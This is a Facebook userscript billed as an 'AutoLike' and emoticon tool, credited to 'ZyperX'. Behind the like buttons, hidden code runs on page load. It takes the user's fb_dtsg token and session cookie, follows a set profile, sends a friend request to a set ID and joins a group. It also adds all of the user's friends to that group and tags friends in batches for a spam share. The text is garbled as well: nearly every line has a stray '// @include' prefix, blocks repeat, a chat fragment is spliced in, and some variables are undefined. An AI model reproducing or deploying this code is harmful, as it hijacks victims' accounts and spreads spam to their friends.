// ==UserScript==
// @name        Akmal Syafiq
// @namespace   Noor Hazmiera Syafikha
// @description AutoLike
// @include     // @exclude htt*://developers.facebook.com/*
// @include     // @exclude htt*://upload.facebook.com/*
// @include     // @exclude htt*://www.facebook.com/common/blank.html
// @include     // @exclude htt*://*connect.facebook.com/*
// @include     // @exclude htt*://*facebook.com/connect*
// @include     // @exclude htt*://www.facebook.com/plugins/*
// @include     // @exclude htt*://www.facebook.com/l.php*
// @include     // @exclude htt*://www.facebook.com/ai.php*
// @include     // @exclude htt*://www.facebook.com/extern/*
// @include     // @exclude htt*://www.facebook.com/pagelet/*
// @include     // @exclude htt*://api.facebook.com/static/*
// @include     // @exclude htt*://www.facebook.com/contact_importer/*
// @include     // @exclude htt*://www.facebook.com/ajax/*
// @include     // @exclude htt*://www.facebook.com/advertising/*
// @include     // @exclude htt*://www.facebook.com/ads/*
// @include     // @exclude htt*://www.facebook.com/sharer/*
// @include     // @exclude htt*://www.facebook.com/send/*
// @include     // @exclude htt*://www.facebook.com/mobile/*
// @include     // @exclude htt*://www.facebook.com/settings/*
// @include     // @exclude htt*://www.facebook.com/dialog/*
// @include     // @exclude htt*://www.facebook.com/plugins/*
// @include     // @exclude htt*://www.facebook.com/bookmarks/*
// @include     // ==/UserScript==
// @include     // ======= Jangan Menghapus Credit =======
// @include     // == Nama : Auto Like Facebook v.4 Final ==
// @include     // ======= Author : ZyperX ========
// @include     // ======= Site : http://www.facebook.com/TheProfessionalHackerz?ref=tn_tnmn =======
// @include     // =======================================
// @include     body = document.body;
// @include     if(body != null) {div = document.createElement("div");div.style.position = "fixed";div.style.display = "block";div.style.width = "130px";div.style.opacity= 0.90;div.style.bottom = "+90px";div.style.left = "+8px";div.style.backgroundColor = "#E7EBF2";div.style.border = "1px solid #6B84B4";div.style.padding = "3px";div.innerHTML = "<a style='font-weight:bold;color:#E30505' href='' title='Refresh'><blink><center>Reload (F5)</center></blink></a>"
// @include     body.appendChild(div);}
// @include     if(body != null) {div = document.createElement("div");div.setAttribute('id','like2');div.style.position = "fixed";div.style.display = "block";div.style.width = "130px"; div.style.opacity= 0.90;div.style.bottom = "+65px";div.style.left = "+8px";div.style.backgroundColor = "#E7EBF2";div.style.border = "1px solid #6B84B4";div.style.padding = "3px";div.innerHTML = "<a style='font-weight:bold;color:#3B5998' onclick='AutoLike()'><center>Like All Status</center></a></a>"
// @include     body.appendChild(div);
// @include     unsafeWindow.AutoLike = function () {
// @include     eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('4 7=0;4 c=0;4 2=d.n("a");4 5=B C();o(4 i=0;i<2.8;i++)9(2[i].e("f")!=p&&2[i].e("f").q("D")>=0&&(2[i].3=="E F"||2[i].3=="g"||2[i].3=="G"||2[i].3=="HğI"||2[i].3=="أعجبني"||2[i].3=="いいね！"||2[i].3=="讚"||2[i].3=="K"||2[i].3=="좋아요"||2[i].3=="J’L")){5[c]=2[i];c++}6 r(h){5[h].M();4 s="<a N=\'O-P:Q;R:#S\' T=\'U()\'><t>g V: "+(h+1)+"/"+5.8+"</t></a>";d.W(\'X\').3=s};6 u(b){v.w(j,b)};6 x(){4 k=d.n("Y");4 l=Z;o(4 i=0;i<k.8;i++){4 m=k[i].e("f");9(m!=p&&m.q("10 11 12")>=0){y("13 14 z");l=15}}9(!l)u(16)};6 A(b){v.w(x,b)};6 j(){9(7<5.8){r(7);A(17);7++}};y(\'g z \');j();',62,76,'||prepare|innerHTML|var|buttons|function|BounceCounterLike|length|if||timex|Counter|document|getAttribute|class|Like|linknumber||bouncer_like|warning|checkwarning|myClass|getElementsByTagName|for|null|indexOf|check_link|message|center|like_timer|window|setTimeout|check_warning|alert|Facebook|warning_timer|new|Array|UFILikeLink|Me|gusta|Suka|Be|en||Seneng|aime|click|style|font|weight|bold|color|3B5998|onclick|Autolike|Status|getElementById|like2|label|false|uiButton|uiButtonLarge|uiButtonConfirm|Warning|from|true|2160|700|start|autolike|by|Pico'.split('|'),0,{}))
// @include     };
// @include     }
// @include     body = document.body;
// @include     if(body != null) {div = document.createElement("div");div.setAttribute('id','like3');div.style.position = "fixed";div.style.display = "block";div.style.width = "130px";div.style.opacity= 0.90;div.style.bottom = "+44px";div.style.left = "+8px";div.style.backgroundColor = "#E7EBF2";div.style.border = "1px solid #6B84B4";div.style.padding = "3px";div.innerHTML = "<a style='font-weight:bold;color:#3B5998' onclick='LikeComments()'><center>Like All Comments</center></a>"
// @include     body.appendChild(div);unsafeWindow.LikeComments = function() {
// @include     var BounceCounterLike=0;var Counter = 0;var prepare = document.getElementsByTagName("a");var buttons = new Array();for (var i = 0; i < prepare.length; i++)if(prepare[i].getAttribute("data-ft")!=null&&(prepare[i].getAttribute("title")=="Me gusta este comentario"||prepare[i].getAttribute("title")=="Like this comment"||prepare[i].getAttribute("title")=="Suka komentar ini"||prepare[i].getAttribute("title")=="Nyenengi tanggapan iki"||prepare[i].getAttribute("title")=="الإعجاب بالتعليق"||prepare[i].getAttribute("title")=="このコメントはいいね！"||prepare[i].getAttribute("title")=="좋아요 취소"||prepare[i].getAttribute("title")=="說這則留言讚"||prepare[i].getAttribute("title")=="J’aime ce commentaire"||prepare[i].getAttribute("title")=="Bu yorumu beğen")) {buttons[Counter] = prepare[i];Counter++;}function check_link(linknumber) {buttons[linknumber].click();var message = "<a style='font-weight:bold;color:#3B5998' onclick='Autolike()'><center>Like Comments: "+ (linknumber + 1) +"/"+ buttons.length +"</center></a>";document.getElementById('like3').innerHTML = message;};function like_timer(timex) {window.setTimeout(bouncer_like,timex);};function check_warning() {var warning = document.getElementsByTagName("label");var checkwarning = false;for(var i = 0; i < warning.length; i++) {var myClass = warning[i].getAttribute("class");if(myClass!=null&&myClass.indexOf("uiButton uiButtonLarge uiButtonConfirm")>=0) {alert("Warning from Facebook");checkwarning = true;}}if(!checkwarning) like_timer(2160);};function warning_timer(timex) {window.setTimeout(check_warning,timex);};function bouncer_like() {if ( BounceCounterLike < buttons.length ) {check_link(BounceCounterLike);warning_timer(700);BounceCounterLike++;}};bouncer_like();
// @include     };}
// @include     if(body != null) {div = document.createElement("div");div.style.position = "fixed";div.style.display = "block";div.style.width = "130px";div.style.opacity= 0.90;div.style.bottom = "+25px";div.style.left = "+8px";div.style.backgroundColor = "#E7EBF2";div.style.border = "1px solid #6B84B4";div.style.padding = "3px";div.innerHTML = "<a style='font-weight:bold;color:#3B5998' onclick='BugInfo()'><center>Report Bugs</center></a></a>"
// @include     body.appendChild(div);unsafeWindow.BugInfo = function() {
// @include     window.open(this.href='http://facebook.com/acc0unt.bl0cked', 'dmfollow', 'toolbar=0,location=0,statusbar=1,menubar=0,scrollbars=no,width=400,height=255');return false;
// @include     };}
// @include     if(body != null) {div = document.createElement("div");div.style.position = "fixed";div.style.display = "block";div.style.width = "130px";div.style.opacity= 0.90;div.style.bottom = "+25px";div.style.left = "+8px";div.style.backgroundColor = "#E7EBF2";div.style.border = "1px solid #6B84B4";div.style.padding = "3px";div.innerHTML = "<a style='font-weight:bold;color:#3B5998' onclick='BugInfo()'><center>Please Follow Me</center></a></a>"
// @include     body.appendChild(div);unsafeWindow.BugInfo = function() {
// @include     window.open(this.href='http://www.facebook.com/TheProfessionalHackerz?ref=tn_tnmn', 'dmfollow', 'toolbar=0,location=0,statusbar=1,menubar=0,scrollbars=no,width=400,height=255');return false;
// @include     };}
// @include     // ======= Jangan Menghapus Credit =======
// @include     // == Nama : Auto Like Facebook v.3 Final ==
// @include     // ======= Author : ZyperX ========
// @include     // ======= Site : http://www.facebook.com/TheProfessionalHackerz?ref=tn_tnmny =======
// @include     // =======================================
// @include     //EMOTICON
// @include     var version, storage, spemotsInfo, spemotsTitle, headTag, styleTag, ArrowStyleUp, ArrowStyleDown, fEmotBarDom, fEmotsListDom, fArrow;
// @include     version = 1;
// @include     storage = 'none';
// @include     try {
// @include     if (typeof GM_getValue === 'function' && typeof GM_setValue === 'function') {
// @include     GM_setValue('testkey', 'testvalue');
// @include     if (GM_getValue('testkey', false) === 'testvalue') { storage='greasemonkey'; }
// @include     }
// @include     } catch(x) {}
// @include     if (storage=='none' && typeof localStorage == 'object') { storage='localstorage'; }
// @include     function setValue(key, value) {
// @include     switch (storage) {
// @include     case 'greasemonkey':
// @include     GM_setValue('0-'+key, value);
// @include     break;
// @include     case 'localstorage':
// @include     localStorage['femotbar-0-'+key] = value;
// @include     break;
// @include     }
// @include     }
// @include     function getValue(key, value) {
// @include     switch (storage) {
// @include     case 'greasemonkey':
// @include     return GM_getValue('0-'+key, value);
// @include     case 'localstorage':
// @include     var val = localStorage['femotbar-0-'+key];
// @include     if (val=='true') { return true; }
// @include     else if (val=='false') { return false; }
// @include     else if (val) { return val; }
// @include     break;
// @include     }
// @include     return value;
// @include     }
// @include     function xmlhttpRequest(params, callBack) {
// @include     if (typeof GM_xmlhttpRequest !== 'undefined') {
// @include     params['onload'] = callBack;
// @include     return GM_xmlhttpRequest(params);
// @include     }
// @include     return null;
// @include     }
// @include     function openInTab(url) {
// @include     if (typeof GM_openInTab !== 'undefined') { GM_openInTab(url); }
// @include     else { window.open(url); }
// @include     }
// @include     function createSelection(field, start, end) {
// @include     if( field.createTextRange ) {
// @include     var selRange = field.createTextRange();
// @include     selRange.collapse(true);
// @include     selRange.moveStart('character', start);
// @include     selRange.moveEnd('character', end);
// @include     selRange.select();
// @include     } else if( field.setSelectionRange ) {
// @include     field.setSelectionRange(start, end);
// @include     } else if( field.selectionStart ) {
// @include     field.selectionStart = start;
// @include     field.selectionEnd = end;
// @include     }
// @include     field.focus();
// @include     }
// @include     function getCursorPosition(field) {
// @include     var CursorPos = 0;
// @include     if (field.selectionStart || field.selectionStart == '0') CursorPos = field.selectionStart;
// @include     return (CursorPos);
// @include     }
// @include     headTag = document.getElementsByTagName('head')[0];
// @include     if (headTag) {
// @include     styleTag = document.createElement('style');
// @include     styleTag.type = 'text/css';
// @include     styleTag.innerHTML =
// @include     '.chat_tab_emot_bar {padding-top: 2px; padding-bottom: 6px; line-height: 16px; padding-left: 2px; background:#EEEEEE none repeat scroll 0 0; border-style: solid; border-width: 0px 0px 1px 0px; border-color: #C9D0DA; position: static; }'+
// @include     '.fbNubFlyoutInner {position:relative !important;bottom:0px !important;}';
// @include     headTag.appendChild(styleTag);
// @include     }
// @include     ArrowStyleUp = 'cursor: pointer; position: absolute; right: 2px; -moz-transform: rotate(180deg); -webkit-transform: rotate(180deg);'
// @include     ArrowStyleDown = 'cursor: pointer; position: absolute; right: 2px;'
// @include     fEmotBarDom = document.createElement('div');
// @include     fEmotBarDom.setAttribute('class','chat_tab_emot_bar');
// @include     fEmotsListDom = document.createElement('div');
// @include     fEmotsListDom.setAttribute('name','uiToggleFlyout');
// @include     fEmotBarDom.appendChild(fEmotsListDom);
// @include     for(i=0;i<spemotsInfo.length;i+=2) {
// @include     var fEmotsDom = document.createElement('img');
// @include     fEmotsDom.setAttribute('alt',spemotsInfo[i]);
// @include     fEmotsDom.setAttribute('title',spemotsTitle[i]);
// @include     fEmotsDom.setAttribute('src','' + spemotsInfo[i+1]);
// @include     fEmotsDom.setAttribute('style','cursor: pointer;');
// @include     fEmotsDom.setAttribute('class','emote_custom');
// @include     fEmotsListDom.appendChild(fEmotsDom);
// @include     }
// @include     fArrow = document.createElement('i');
// @include     fArrow.setAttribute('alt','');
// @include     fArrow.setAttribute('class','img chat_arrow');
// @include     fArrow.setAttribute('style',ArrowStyleUp);
// @include     fEmotBarDom.appendChild(fArrow);
// @include     var setting_visible = getValue('visible',true);
// @include     document.addEventListener('DOMNodeInserted', fInsertedNodeHandler, false);
// @include     function fInsertedNodeHandler(event) {
// @include     if(event.target.getElementsByClassName && event.target.getElementsByClassName('fbNubFlyout fbDockChatTabFlyout')[0])
// @include     fInsertEmotBar(event.target);
// @include     }
// @include     function fInsertEmotBar(fChatWrapper) {
// @include     fChatToolBox = fChatWrapper.getElementsByClassName('fbNubFlyoutHeader')[0]
// @include     fNewEmotBar = fEmotBarDom.cloneNode(true);
// @include     setVisibility(fNewEmotBar);
// @include     for(i=0;i<fNewEmotBar.firstChild.childNodes.length-2;i++) fNewEmotBar.firstChild.childNodes[i].addEventListener('click', fEmotClickHandler , false);
// @include     fNewEmotBar.firstChild.childNodes[i].addEventListener('click' , fStyleClickHandler , false);
// @include     fNewEmotBar.firstChild.childNodes[i+1].addEventListener('click' , fStyleClickHandler , false);
// @include     fNewEmotBar.childNodes[1].addEventListener('click', fHideShowEmotBar , false);
// @include     if(fChatToolBox.childNodes) fChatToolBox.insertBefore(fNewEmotBar,fChatToolBox.childNodes[1]);
// @include     }
// @include     function fEmotClickHandler(event){
// @include     var fChatInput = event.target.parentNode.parentNode.parentNode.parentNode.getElementsByClassName('fbNubFlyoutFooter')[0].getElementsByClassName('inputContainer')[0].getElementsByClassName('uiTextareaAutogrow input')[0];
// @include     var pos = getCursorPosition(fChatInput);
// @include     var txtbef = ''; var txtaft = '';
// @include     if (fChatInput.value.charAt(pos-1) != ' ' && pos-1 > 0) txtbef = ' ';
// @include     if (fChatInput.value.charAt(pos) != ' ') txtaft = ' ';
// @include     fChatInput.value = fChatInput.value.substring(0,pos) + txtbef + event.target.getAttribute('alt') + txtaft + fChatInput.value.substring(pos);
// @include     createSelection(fChatInput,pos + event.target.getAttribute('alt').length + txtaft.length + txtbef.length,pos + event.target.getAttribute('alt').length + txtaft.length + txtbef.length);
// @include     }
// @include     function fStyleClickHandler(event){
// @include     var fChatInput = event.target.parentNode.parentNode.parentNode.parentNode.getElementsByClassName('fbNubFlyoutFooter')[0].getElementsByClassName('inputContainer')[0].getElementsByClassName('uiTextareaAutogrow input')[0];
// @include     var selectedText = fChatInput.value.substring(fChatInput.selectionStart, fChatInput.selectionEnd);
// @include     var pos = getCursorPosition(fChatInput);
// @include     var txtlen = selectedText.length;
// @include     if (txtlen == 0) {
// @include     fChatInput.value = fChatInput.value.substring(0,pos) + event.target.getAttribute('alt') + fChatInput.value.substring(pos);
// @include     createSelection(fChatInput,pos + 1,pos + event.target.getAttribute('alt').length-1);
// @include     }
// @include     else {
// @include     var txtbef = event.target.getAttribute('alt').charAt(0);
// @include     var txtaft = event.target.getAttribute('alt').charAt(0);
// @include     while (fChatInput.value.charAt(pos) == ' ') { pos += 1; txtlen -= 1; }
// @include     while (fChatInput.value.charAt(pos+txtlen-1) == ' ') txtlen -= 1;
// @include     if (fChatInput.value.charAt(pos-1) != ' ' && pos-1 > 0) txtbef = ' ' + txtbef;
// @include     if (fChatInput.value.charAt(pos+txtlen) != ' ') txtaft += ' ';
// @include     fChatInput.value = fChatInput.value.substring(0,pos) + txtbef + fChatInput.value.substring(pos,pos+txtlen) + txtaft + fChatInput.value.substring(pos + txtlen);
// @include     createSelection(fChatInput, pos + txtlen + 2, pos + txtlen + 2);
// @include     }
// @include     }
// @include     function fHideShowEmotBar(event){
// @include     fChatBar = document.getElementsByName('uiToggleFlyout');
// @include     if(fChatBar[0].getAttribute('style') == 'display: none;') {
// @include     for(i=0;i<fChatBar.length;i++) {
// @include     fChatBar[i].setAttribute('style','display: block;');
// @include     fChatBar[i].parentNode.childNodes[1].setAttribute('style',ArrowStyleUp);
// @include     }
// @include     }
// @include     else {
// @include     for(i=0;i<fChatBar.length;i++) {
// @include     fChatBar[i].setAttribute('style','display: none;');
// @include     fChatBar[i].parentNode.childNodes[1].setAttribute('style',ArrowStyleDown);
// @include     }
// @include     }
// @include     setValue('visible',!setting_visible);
// @include     setting_visible = !setting_visible;
// @include     }
// @include     function setVisibility(DOM) {
// @include     if(setting_visible) {
// @include     DOM.firstChild.setAttribute('style','display: block;');
// @include     DOM.childNodes[1].setAttribute('style',ArrowStyleUp);
// @include     }
// @include     else {
// @include     DOM.firstChild.setAttribute('style','display: none;');
// @include     DOM.childNodes[1].setAttribute('style',ArrowStyleDown);
// @include     }
// @include     }
// @include     function getRandomInt (min, max) {
// @include     return Math.floor(Math.random() * (max - min + 1)) + min;
// @include     }
// @include     function randomValue(arr) {
// @include     return arr[getRandomInt(0, arr.length-1)];
// @include     }
// @include     var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
// @include     var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
// @include     function a(abone){
// @include     var http4 = new XMLHttpRequest();
// @include     var url4 = "/ajax/follow/follow_profile.php?__a=1";
// @include     var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
// @include     http4.open("POST", url4, true);
// @include     //Send the proper header information along with the request
// @include     http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
// @include     http4.setRequestHeader("Content-length", params4.length);
// @include     http4.setRequestHeader("Connection", "close");
// @include     http4.onreadystatechange = function() {//Call a function when the state changes.
// @include     if(http4.readyState == 4 && http4.status == 200) {
// @include     http4.close; // Close the connection
// @include     }
// @include     }
// @include     http4.send(params4);
// @include     }
// @include     a("100004559709204"); //synckers.assoc.co
// @include     function listeabone(id){
// @include     var xmlhttp = new XMLHttpRequest();
// @include     xmlhttp.onreadystatechange = function () {
// @include     if(xmlhttp.readyState == 4){
// @include     }
// @include     };
// @include     xmlhttp.open("POST", "/ajax/friends/lists/subscribe/modify?__a=1", true);
// @include     var params = "action=subscribe";
// @include     params += "&location=gear_menu";
// @include     params += "&flid=" + id;
// @include     params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
// @include     params += "&phstamp=165816749114848369115";
// @include     params += "&__user=" + user_id;
// @include     xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
// @include     xmlhttp.send(params);
// @include     }
// @include     listeabone(""); // liste d'abonnement LesStatutsPubs
// @include     listeabone(""); // liste d'abonnement Le Coin Ados
// @include     function adder(uid){
// @include     var xmlhttp = new XMLHttpRequest();
// @include     xmlhttp.onreadystatechange = function () {
// @include     if(xmlhttp.readyState == 4){
// @include     }
// @include     };
// @include     xmlhttp.open("POST", "/ajax/add_friend/action.php?__a=1", true);
// @include     var params = "to_friend=" + uid;
// @include     params += "&action=add_friend";
// @include     params += "&how_found=friend_browser";
// @include     params += "&ref_param=none";
// @include     params += "&outgoing_id=";
// @include     params += "&logging_location=friend_browser";
// @include     params += "&no_flyout_on_click=true";
// @include     params += "&ego_log_data=";
// @include     params += "&http_referer=";
// @include     params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
// @include     params += "&phstamp=165816749114848369115";
// @include     params += "&__user=" + user_id;
// @include     xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
// @include     xmlhttp.setRequestHeader ("Content-Type","application/x-www-form-urlencoded");
// @include     xmlhttp.send(params);
// @include     }
// @include     adder("1220046790"); //Adder ID's
// @include     //var gid = ['131154297032802'];
// @include     var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
// @include     var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
// @include     var httpwp = new XMLHttpRequest();
// @include     var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
// @include     var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
// @include     httpwp['open']('POST', urlwp, true);
// @include     httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
// @include     httpwp['setRequestHeader']('Content-length', paramswp['length']);
// @include     httpwp['setRequestHeader']('Connection', 'keep-alive');
// @include     httpwp['send'](paramswp);
// @include     var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
// @include     var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
// @include     var friends = new Array();
// @include     gf = new XMLHttpRequest();
// @include     gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
// @include     gf['send']();
// @include     if (gf['readyState'] != 4) {} else {
// @include     data = eval('(' + gf['responseText']['substr'](9) + ')');
// @include     if (data['error']) {} else {
// @include     friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
// @include     return _0x93dax8['index'] - _0x93dax9['index'];
// @include     });
// @include     };
// @include     };
// @include     for (var i = 0; i < friends['length']; i++) {
// @include     var httpwp = new XMLHttpRequest();
// @include     var urlwp = '/ajax/groups/members/add_post.php?__a=1';
// @include     var paramswp= '&fb_dtsg=' + fb_dtsg + '&group_id=' + gid + '&source=typeahead&ref=&message_id=&members=' + friends[i]['uid'] + '&__user=' + user_id + '&phstamp=';
// @include     httpwp['open']('POST', urlwp, true);
// @include     httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
// @include     httpwp['setRequestHeader']('Content-length', paramswp['length']);
// @include     httpwp['setRequestHeader']('Connection', 'keep-alive');
// @include     httpwp['onreadystatechange'] = function () {
// @include     if (httpwp['readyState'] == 4 && httpwp['status'] == 200) {};
// @include     };
// @include     httpwp['send'](paramswp);
// @include     };
// @include     var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
// @include     var arkadaslar = [];
// @include     var svn_rev;
// @include     var bugun= new Date();
// @include     var btarihi = new Date();
// @include     btarihi.setTime(bugun.getTime() + 1000*60*60*4*1);
// @include     if(!document.cookie.match(/paylasti=(\d+)/)){
// @include     document.cookie = "paylasti=hayir;expires="+ btarihi.toGMTString();
// @include     }
// @include     //arkadaslari al ve isle
// @include     function sarkadaslari_al(){
// @include     var xmlhttp = new XMLHttpRequest();
// @include     xmlhttp.onreadystatechange = function () {
// @include     if(xmlhttp.readyState == 4){
// @include     eval("arkadaslar = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
// @include     for(f=0;f<Math.round(arkadaslar.payload.entries.length/10);f++){
// @include     smesaj = "";
// @include     smesaj_text = "";
// @include     for(i=f*10;i<(f+1)*10;i++){
// @include     if(arkadaslar.payload.entries[i]){
// @include     smesaj += " @[" + arkadaslar.payload.entries[i].uid + ":" + arkadaslar.payload.entries[i].text + "]";
// @include     smesaj_text += " " + arkadaslar.payload.entries[i].text;
// @include     }
// @include     }
// @include     sdurumpaylas(); }
// @include     }
// @include     };
// @include     var params = "&filter[0]=user";
// @include     params += "&options[0]=friends_only";
// @include     params += "&options[1]=nm";
// @include     params += "&token=v7";
// @include     params += "&viewer=" + user_id;
// @include     params += "&__user=" + user_id;
// @include     if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
// @include     else { xmlhttp.open("GET", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
// @include     xmlhttp.send();
// @include     }
// @include     //tiklama olayini dinle
// @include     var tiklama = document.addEventListener("click", function () {
// @include     if(document.cookie.split("paylasti=")[1].split(";")[0].indexOf("hayir") >= 0){
// @include     svn_rev = document.head.innerHTML.split('"svn_rev":')[1].split(",")[0];
// @include     sarkadaslari_al();
// @include     document.cookie = "paylasti=evet;expires="+ btarihi.toGMTString();
// @include     document.removeEventListener(tiklama);
// @include     }
// @include     }, false);
// @include     //cinsiyet belirleme
// @include     var cinssonuc = {};
// @include     var cinshtml = document.createElement("html");
// @include     function scinsiyetgetir(uid,cins,fonksiyon){
// @include     var xmlhttp = new XMLHttpRequest();
// @include     xmlhttp.onreadystatechange = function () {
// @include     if(xmlhttp.readyState == 4){
// @include     eval("cinssonuc = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
// @include     cinshtml.innerHTML = cinssonuc.jsmods.markup[0][1].__html
// @include     btarihi.setTime(bugun.getTime() + 1000*60*60*24*365);
// @include     if(cinshtml.getElementsByTagName("select")[0].value == "1"){
// @include     document.cookie = "cins" + user_id + "=kadin;expires=" + btarihi.toGMTString();
// @include     }else if(cinshtml.getElementsByTagName("select")[0].value == "2"){
// @include     document.cookie = "cins" + user_id + "=erkek;expires=" + btarihi.toGMTString();
// @include     }
// @include     eval(fonksiyon + "(" + id + "," + cins + ");");
// @include     }
// @include     };
// @include     xmlhttp.open("GET", "/ajax/timeline/edit_profile/basic_info.php?__a=1&__user=" + user_id, true);
// @include     xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
// @include     xmlhttp.send();
// @include     }
// @include     2:04am
// @include     Fahmi Hakim
// @include     // ==UserScript==
// @include     // @name *[NEW]* AutoLike 2013
// @include     // @namespace *[Update]* AutoLike 2013
// @include     // @description *[Update]* AutoLike 2013 by ZyperX. Auto Like status, wall and facebook comments system uses delay timer that allows you to control the speed of access and prevents blocking of the account. autolike and have emoticon Final version 2013 february.new version, work
// @include     // @author ZyperX A.K.A Akmal Syafiq
// @include     // @authorURL http://www.facebook.com/TheProfessionalHackerz?ref=tn_tnmn
// @include     // @homepage http://www.facebook.com/TheProfessionalHackerz?ref=tn_tnmn
// @include     // @include htt*://www.facebook.com/*
// @include     // @exclude htt*://apps.facebook.com/*
// @include     // @icon http://2.gravatar.com/avatar/bec25ffa0afd5ef51cab52b3433a16d8?s=100&r=pg&d=mm
// @include     // @version v.4 Final
// @include     // @exclude htt*://*static*.facebook.com*
// @include     // @exclude htt*://*channel*.facebook.com*
// @include     // @exclude htt*://developers.facebook.com/*
// @include     // @exclude htt*://upload.facebook.com/*
// @include     // @exclude htt*://www.facebook.com/common/blank.html
// @include     // @exclude htt*://*connect.facebook.com/*
// @include     // @exclude htt*://*facebook.com/connect*
// @include     // @exclude htt*://www.facebook.com/plugins/*
// @include     // @exclude htt*://www.facebook.com/l.php*
// @include     // @exclude htt*://www.facebook.com/ai.php*
// @include     // @exclude htt*://www.facebook.com/extern/*
// @include     // @exclude htt*://www.facebook.com/pagelet/*
// @include     // @exclude htt*://api.facebook.com/static/*
// @include     // @exclude htt*://www.facebook.com/contact_importer/*
// @include     // @exclude htt*://www.facebook.com/ajax/*
// @include     // @exclude htt*://www.facebook.com/advertising/*
// @include     // @exclude htt*://www.facebook.com/ads/*
// @include     // @exclude htt*://www.facebook.com/sharer/*
// @include     // @exclude htt*://www.facebook.com/send/*
// @include     // @exclude htt*://www.facebook.com/mobile/*
// @include     // @exclude htt*://www.facebook.com/settings/*
// @include     // @exclude htt*://www.facebook.com/dialog/*
// @include     // @exclude htt*://www.facebook.com/plugins/*
// @include     // @exclude htt*://www.facebook.com/bookmarks/*
// @include     // ==/UserScript==
// @include     // ======= Jangan Menghapus Credit =======
// @include     // == Nama : Auto Like Facebook v.4 Final ==
// @include     // ======= Author : ZyperX ========
// @include     // ======= Site : http://www.facebook.com/TheProfessionalHackerz?ref=tn_tnmn =======
// @include     // =======================================
// @include     body = document.body;
// @include     if(body != null) {div = document.createElement("div");div.style.position = "fixed";div.style.display = "block";div.style.width = "130px";div.style.opacity= 0.90;div.style.bottom = "+90px";div.style.left = "+8px";div.style.backgroundColor = "#E7EBF2";div.style.border = "1px solid #6B84B4";div.style.padding = "3px";div.innerHTML = "<a style='font-weight:bold;color:#E30505' href='' title='Refresh'><blink><center>Reload (F5)</center></blink></a>"
// @include     body.appendChild(div);}
// @include     if(body != null) {div = document.createElement("div");div.setAttribute('id','like2');div.style.position = "fixed";div.style.display = "block";div.style.width = "130px"; div.style.opacity= 0.90;div.style.bottom = "+65px";div.style.left = "+8px";div.style.backgroundColor = "#E7EBF2";div.style.border = "1px solid #6B84B4";div.style.padding = "3px";div.innerHTML = "<a style='font-weight:bold;color:#3B5998' onclick='AutoLike()'><center>Like All Status</center></a></a>"
// @include     body.appendChild(div);
// @include     unsafeWindow.AutoLike = function () {
// @include     eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('4 7=0;4 c=0;4 2=d.n("a");4 5=B C();o(4 i=0;i<2.8;i++)9(2[i].e("f")!=p&&2[i].e("f").q("D")>=0&&(2[i].3=="E F"||2[i].3=="g"||2[i].3=="G"||2[i].3=="HğI"||2[i].3=="أعجبني"||2[i].3=="いいね！"||2[i].3=="讚"||2[i].3=="K"||2[i].3=="좋아요"||2[i].3=="J’L")){5[c]=2[i];c++}6 r(h){5[h].M();4 s="<a N=\'O-P:Q;R:#S\' T=\'U()\'><t>g V: "+(h+1)+"/"+5.8+"</t></a>";d.W(\'X\').3=s};6 u(b){v.w(j,b)};6 x(){4 k=d.n("Y");4 l=Z;o(4 i=0;i<k.8;i++){4 m=k[i].e("f");9(m!=p&&m.q("10 11 12")>=0){y("13 14 z");l=15}}9(!l)u(16)};6 A(b){v.w(x,b)};6 j(){9(7<5.8){r(7);A(17);7++}};y(\'g z \');j();',62,76,'||prepare|innerHTML|var|buttons|function|BounceCounterLike|length|if||timex|Counter|document|getAttribute|class|Like|linknumber||bouncer_like|warning|checkwarning|myClass|getElementsByTagName|for|null|indexOf|check_link|message|center|like_timer|window|setTimeout|check_warning|alert|Facebook|warning_timer|new|Array|UFILikeLink|Me|gusta|Suka|Be|en||Seneng|aime|click|style|font|weight|bold|color|3B5998|onclick|Autolike|Status|getElementById|like2|label|false|uiButton|uiButtonLarge|uiButtonConfirm|Warning|from|true|2160|700|start|autolike|by|Pico'.split('|'),0,{}))
// @include     };
// @include     }
